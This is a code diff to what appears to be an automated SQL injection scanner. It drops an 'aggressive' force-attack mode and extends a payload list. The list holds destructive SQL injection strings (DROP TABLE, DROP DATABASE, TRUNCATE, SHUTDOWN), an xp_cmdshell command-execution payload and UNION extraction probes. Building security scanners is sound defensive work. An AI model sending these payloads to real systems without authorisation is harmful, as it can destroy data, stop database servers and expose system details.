@@ -8,16 +8,13 @@ def run_sqli_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, A
     baseline = client.send(scenario.method, scenario.target, json_body={"username": "test", "password": "password"})
     
     if baseline.status_code in [404, 405]:
-        if scenario.config.get("aggressive"):
-            print(f"    [AGGRESSIVE] FORCE-ATTACK: Ignoring status {baseline.status_code}. Injecting SQL payloads...")
-        else:
-            return {
-                "scenario_id": scenario.id,
-                "attack_type": "sql_injection",
-                "passed": True,
-                "skipped": True,
-                "details": f"Endpoint returned {baseline.status_code}. Skipping attack."
-            }
+        return {
+            "scenario_id": scenario.id,
+            "attack_type": "sql_injection",
+            "passed": True,
+            "skipped": True,
+            "details": f"Endpoint {scenario.target} returned {baseline.status_code}. Path does not exist or is blocked. Skipping SQLi."
+        }
         
     baseline_len = len(baseline.text)
     
@@ -61,8 +58,14 @@ def run_sqli_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, A
         payloads.extend([
             {"payload": "'; DROP TABLE users; --", "type": "schema_modification"},
             {"payload": "'; DROP TABLE accounts; --", "type": "schema_modification"},
+            {"payload": "'; DROP DATABASE test; --", "type": "schema_modification"},
             {"payload": "'; TRUNCATE TABLE users; --", "type": "schema_modification"},
-            {"payload": "'; EXEC xp_cmdshell('echo HACKED > C:\\hacked.txt'); --", "type": "rce_via_sqli"}
+            {"payload": "'; SHUTDOWN; --", "type": "schema_modification"},
+            {"payload": "'; SHUTDOWN WITH NOWAIT; --", "type": "schema_modification"},
+            {"payload": "'; EXEC xp_cmdshell('echo HACKED > C:\\hacked.txt'); --", "type": "rce_via_sqli"},
+            {"payload": "' UNION SELECT NULL, NULL, NULL, NULL, NULL--", "type": "union_fuzz"},
+            {"payload": "' UNION SELECT 1, 2, 3, 4, 5, 6, 7, 8, 9, 10--", "type": "union_fuzz"},
+            {"payload": "' UNION SELECT @@version, user(), database()--", "type": "union_extraction"}
         ])
     
     fields = scenario.config.get("fields", ["username", "password", "id", "q"])
@@ -84,10 +87,14 @@ def run_sqli_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, A
         body = {"username": "test", "password": "password"}
         body[field] = p
         
-        # Timing check
-        start = time.time()
-        resp = client.send(scenario.method, scenario.target, json_body=body)
-        duration = time.time() - start
+        try:
+            # Timing check
+            start = time.time()
+            resp = client.send(scenario.method, scenario.target, json_body=body)
+            duration = time.time() - start
+        except Exception:
+            # Network/Proxy mismatch is NOT a vulnerability.
+            return
         
         # --- DIFFERENTIAL ANALYSIS ---
         suspicious = False
